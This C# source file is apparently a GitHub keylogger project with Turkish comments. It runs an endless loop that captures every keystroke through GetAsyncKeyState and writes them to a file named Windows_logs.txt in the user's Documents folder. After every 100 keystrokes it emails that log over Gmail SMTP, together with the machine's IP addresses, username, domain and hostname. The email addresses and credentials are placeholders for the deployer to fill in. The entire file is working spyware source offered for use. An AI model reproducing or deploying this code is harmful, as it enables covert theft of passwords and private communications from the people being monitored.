using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;


namespace keylogger
{

    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long t_hamle=0;
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("\n\t\t\t\t\tBASIC KEYLOGGER\n\t\t\t\t\tgithub.com/bevkk\n\tTus hamleleri belgelerim klasorunde Windows_logs.txt dosyasinin icinde kayitli tutulacaktir.\n\t\t\tAyni zamanda tus hamlelerini buradan gorebilirsiniz.");
            //Dosya kontrol burada gerçekleşiyor
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (filepath + @"\Windows_logs.txt");
            //Dosya kontrol işlemi burada gerçekleşiyor.
            //KeyLog işlemi burada gerçekleşiyor.
            while (true)
            {
                Thread.Sleep(100);
                for (int i=32;i<127;i++)
                {
                    int TusDurumu = GetAsyncKeyState(i);
                    if (TusDurumu!=0)
                    {
                        Console.Write((char)i + ", ");
                        using (StreamWriter sw=File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }
                        t_hamle++;
                        if (t_hamle%100==0)
                        {
                            MailGonder();
                        }
                    }
                        
                }
                
            }
            //KeyLog işlemi burada gerçekleşiyor.
            Console.ReadKey(); 
        }


        //Text Dosyasını Mail Atma İşlemi Burada Gerçekleşiyor.
        static void MailGonder()
        {
            String dosyaadi = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string dosyayolu = dosyaadi + @"\Windows_logs.txt";
            string emailbody = "";
            String logContents = File.ReadAllText(dosyayolu);
            DateTime zaman = DateTime.Now;

            string konu = "Keylogger Notları" + zaman.Date;
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var address in host.AddressList)
            {
                emailbody += "Adreess : " + address;
            }
            emailbody += "\n user : " + Environment.UserDomainName + "\\" + Environment.UserName;
            emailbody += "\nhost : " + host;
            emailbody += "\ntime : " + DateTime.Now.ToString();
            emailbody += logContents;
            //SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            SmtpClient client = new SmtpClient();
            client.Port = 587;
            client.Host = "smtp.gmail.com";
            client.EnableSsl = true;
            MailMessage mailMessage = new MailMessage();
            mailMessage.From = new MailAddress("#");//Bu alana kendi gmail adresinizi giriniz.
            mailMessage.To.Add("#");//Bu alana kendi gmail adresinizi giriniz.
            mailMessage.Subject = konu;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("#","#");//buraya mail adresinizi
            mailMessage.Body = emailbody;
            client.Send(mailMessage);
        }
        //Text Dosyasını Mail Atma İşlemi Burada Gerçekleşiyor.
    }
}
